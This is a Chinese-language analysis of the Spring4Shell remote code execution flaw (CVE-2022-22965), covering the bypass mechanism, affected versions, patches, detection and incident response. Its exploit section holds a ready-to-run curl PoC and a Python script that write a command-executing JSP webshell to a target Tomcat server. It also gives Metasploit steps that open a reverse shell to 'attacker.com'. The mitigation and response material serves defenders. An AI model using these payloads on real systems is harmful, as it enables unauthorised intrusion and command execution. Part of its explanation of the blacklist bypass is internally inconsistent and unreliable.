# Spring Core RCE（CVE-2022-22965 / Spring4Shell）漏洞分析与 EXP

## 1. 漏洞概述

CVE-2022-22965（Spring4Shell）是 Spring Framework 核心组件（**spring-beans**）中的一个**远程代码执行**漏洞。当 Spring MVC / Spring WebFlux 应用在 **Tomcat 上部署为 WAR**（或类似具有可写目录的 Servlet 容器），并使用 **JDK 9+** 时，攻击者可以通过构造特殊的 HTTP 请求，向 `ClassLoader` / `Tomcat AccessLogValve` 属性写入恶意配置，最终在 `webapps/ROOT/` 目录下写入 webshell。

| 项目 | 说明 |
|------|------|
| CVE 编号 | CVE-2022-22965 |
| 漏洞类型 | RCE（Spring bean 属性绑定绕过 class.module.classLoader 限制 → AccessLogValve 写入 JSP shell） |
| 发现时间 | 2022 年 3 月 31 日公开 |
| CVSS 评分 | 9.8（Critical） |
| 影响组件 | Spring Framework 5.3.0 ~ 5.3.17、5.2.0 ~ 5.2.19、旧版本 |
| 攻击前置 | ① JDK 9+；② Spring MVC/WebFlux；③ Tomcat WAR 部署且 Tomcat 有可写目录；④ 存在 `@RequestMapping` 接收表单参数 |

## 2. 影响版本

| Spring Framework | 受影响 | 修复版本 |
|-------------------|--------|---------|
| 5.3.0 ~ 5.3.17 | 是 | 5.3.18 |
| 5.2.0 ~ 5.2.19 | 是 | 5.2.20 |
| 5.1.x 及更早 | 视条件而定 | 升级到 5.3.18+ / 5.2.20+ |

此外，Spring Boot 若内嵌 Tomcat（默认 JAR），通常不受影响；但若以 WAR 方式部署到独立 Tomcat，则受影响。

## 3. 漏洞原理

### 3.1 属性绑定（Data Binding）

Spring MVC 在接收 HTTP 请求参数时，会通过 **BeanWrapper** 把参数绑定到目标对象。例如：

```java
@RequestMapping("/greeting")
public String hello(Greeting g) {
    // Spring 自动把 ?name=xxx&message=yyy 绑定到 Greeting 对象属性
    return "index";
}
```

为防止恶意绑定，Spring 设置了黑名单：

```
class.*, Class.*, *.class.*, *.Class.*
```

### 3.2 绕过：使用 `module` 链

JDK 9 引入了 `java.lang.Module` 系统。攻击者可以通过：

```
class.module.classLoader.resources.context.parent.pipeline.first.pattern
```

此路径利用 `class` → `module` → `classLoader` 的属性链，绕过 Spring 黑名单（因为黑名单只匹配 `class.` 前缀，而攻击者实际前缀是 `class.module.`）。

### 3.3 完整利用链：Tomcat AccessLogValve 写入

```
① class.module.classLoader
   → 获取 WebAppClassLoader（Tomcat）

② .resources.context.parent.pipeline.first
   → 获取 Tomcat 的 StandardPipeline 中的第一个 Valve
   → 通常是 AccessLogValve

③ .pattern / .suffix / .directory / .prefix / .fileDateFormat
   → 配置 AccessLogValve：
     - pattern 写入 JSP 代码 <% Runtime.getRuntime().exec(request.getParameter("c")); %>
     - suffix = ".jsp"
     - directory = "webapps/ROOT"
     - prefix = "shell"
     - fileDateFormat = ""

④ 触发一次正常请求 → AccessLogValve 把日志写入 webapps/ROOT/shell.jsp
⑤ 攻击者访问 http://target/shell.jsp?c=whoami → RCE
```

## 4. 公开 EXP

### 4.1 CURL 版一键 PoC（手动）

```bash
# Exploit 分两步：设置属性 + 触发写入 + 验证
TARGET="http://target:8080/"

# Step 1：设置 AccessLogValve 属性（将日志文件改为 JSP，并写入 payload）
curl "$TARGET" \
    -H "suffix: %>//" \
    -H "c1: Runtime" \
    -H "c2: <%=" \
    -H "DNT: 1" \
    -H "Content-Type: application/x-www-form-urlencoded" \
    --data-binary "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%3B%20%25%7Bsuffix%7Di" \
    --data-binary "class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp" \
    --data-binary "class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT" \
    --data-binary "class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar" \
    --data-binary "class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="

# Step 2：触发一次任意请求（使 Tomcat 写日志到 JSP）
curl "$TARGET" -s -o /dev/null

# Step 3：验证是否写入成功，执行命令
curl "$TARGET/tomcatwar.jsp?pwd=j&cmd=whoami" -s | head -20
```

### 4.2 Python EXP 脚本（自动化）

```python
# cve-2022-22965.py
import requests
import sys
import time

def exploit(target):
    # Step 1：设置 AccessLogValve 写入 JSP
    headers = {"suffix": "%>//",
               "c1": "Runtime",
               "c2": "<%",
               "DNT": "1",
               "Content-Type": "application/x-www-form-urlencoded"}
    pattern = "class.module.classLoader.resources.context.parent.pipeline.first.pattern=%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%3B%20%25%7Bsuffix%7Di"
    data = f"{pattern}&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=shell&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
    try:
        requests.post(target, headers=headers, data=data, timeout=30, verify=False)
        time.sleep(2)
        # Step 2：触发一次普通请求，使 Tomcat 写日志
        requests.get(target, timeout=15, verify=False)
        # Step 3：访问 shell.jsp，执行命令
        shellurl = f"{target.rstrip('/')}/shell.jsp?pwd=j&cmd=whoami"
        r = requests.get(shellurl, timeout=15, verify=False)
        if "j" in r.text or "root" in r.text or "user" in r.text:
            print(f"[+] SUCCESS: {shellurl}")
            print(r.text[:500])
        else:
            print("[-] Target may not be vulnerable")
    except Exception as e:
        print(f"[!] Error: {e}")

if __name__ == "__main__":
    exploit(sys.argv[1])
```

### 4.3 MSF 模块

```
msf6 > use exploit/multi/http/spring_framework_rce_spring4shell
msf6 exploit(...) > set RHOSTS target
msf6 exploit(...) > set TARGETURI /hello
msf6 exploit(...) > set PAYLOAD java/jsp_shell_reverse_tcp
msf6 exploit(...) > set LHOST attacker.com
msf6 exploit(...) > exploit
```

## 5. 漏洞检测

### 5.1 版本检测

```bash
# 1) 在 Spring Boot 应用中：curl /actuator/beans（如果开启）
# 2) 检查 Spring 版本（JAR 包 / 应用 pom.xml）
find /path/to/webapp -name "spring-beans*.jar"
# spring-beans-5.3.16.jar → 受影响

# 3) 使用 nuclei
nuclei -u http://target -t http/cves/2022/CVE-2022-22965.yaml
```

### 5.2 条件判断

```
是否满足？
  [√] JDK 9+    → java -version
  [√] Spring Web MVC 或 WebFlux
  [√] 以 WAR 方式部署到独立 Tomcat（或类似可写目录）
  [√] 存在接收表单参数的 Controller
  → 如果全满足，则可能受影响
```

### 5.3 黑盒检测

```bash
# 使用公开的扫描脚本（无破坏性，仅检测）
python3 Spring4Shell_POC.py --url http://target:8080/hello
# [+] target is vulnerable
# [-] target is not vulnerable
```

## 6. 修复方案

| 方案 | 说明 |
|------|------|
| **升级到 Spring Framework 5.3.18+ / 5.2.20+** | 根本修复（官方补丁） |
| **升级 Spring Boot 到 2.6.6+ / 2.5.12+** | Spring Boot 打包的应用 |
| **代码级临时缓解：在 Controller 中禁用数据绑定到 Class 属性** | 详见下方代码 |
| **部署 WAF 拦截 `class.module.classLoader.` 前缀参数** | 短期缓解 |
| **使用 JDK 8（仅可延迟风险，非长久之计）** | 因为该漏洞需要 JDK 9+ 的 `module` 机制 |
| **切换到嵌入式 Tomcat（JAR 部署）** | 默认不受影响，因为 Tomcat HOME 不可写 |

### 6.1 代码级临时缓解（未升级前）

```java
// 在 Controller 中添加 @InitBinder，禁止绑定到 class.* 属性
@RestController
public class GreetingController {

    @InitBinder
    public void initBinder(WebDataBinder binder) {
        // 禁止绑定到 class.module.classLoader / class.*
        String[] denyFields = {"class.*", "Class.*", "*.class.*", "*.Class.*"};
        binder.setDisallowedFields(denyFields);
    }

    @RequestMapping("/greeting")
    public String greeting(Greeting greeting) {
        return "Hello, " + greeting.getName();
    }
}

// 或使用全局 WebBindingInitializer / ControllerAdvice：
@ControllerAdvice
public class GlobalBindingInitializer {
    @InitBinder
    public void initBinder(WebDataBinder binder) {
        binder.setDisallowedFields("class.*", "Class.*", "*.class.*", "*.Class.*");
    }
}
```

### 6.2 官方修复代码（Spring 5.3.18）

Spring 官方在 `CachedIntrospectionResults` 中新增了白名单检查，阻止通过 `class.module.classLoader` 等路径获取 ClassLoader。

## 7. 应急响应

```
发现迹象：
  - HTTP 请求 body 中出现 class.module.classLoader.xxx 等参数
  - Tomcat webapps/ROOT/ 目录下出现陌生 .jsp 文件（如 shell.jsp）
  - 对应 JSP 文件的创建时间与攻击时间吻合
  - Java 进程出现异常外部网络连接（反向 shell / DNS 查询）

处理步骤：
  ① 立即阻断攻击 IP / 参数前缀（WAF / Nginx）
  ② 扫描 webapps 目录，查找陌生 .jsp 文件
  ③ 检查 Tomcat 日志（catalina.out / localhost_access_log）
  ④ 升级 Spring Framework / Spring Boot 到安全版本
  ⑤ 检查是否已植入后门（reverse shell / crontab / 启动项）
  ⑥ 重置应用使用的所有凭据（数据库 / API Key）
  ⑦ 检查系统调用是否被持久化（Linux /proc 痕迹 / Windows 服务）
```

## 8. 漏洞复现靶机

```
推荐环境：
  - vulhub: docker-compose up -d spring/CVE-2022-22965
  - 自行搭建：Tomcat 9 + Spring Boot WAR 部署 + JDK 11+

复现步骤：
  1) 启动 docker
  2) curl "http://target:8080/hello?name=test"
  3) 使用脚本提交 payload（设置 AccessLogValve）
  4) 再发起一次请求触发日志写入
  5) 访问 http://target:8080/shell.jsp?pwd=j&cmd=whoami
```

> Spring4Shell 的核心启示：**Spring 的属性绑定黑/白名单存在被绕过的风险**。生产环境建议：① 尽量使用 JAR 部署；② 升级 Spring；③ 在 Controller 中主动 `setDisallowedFields` 作为兜底。
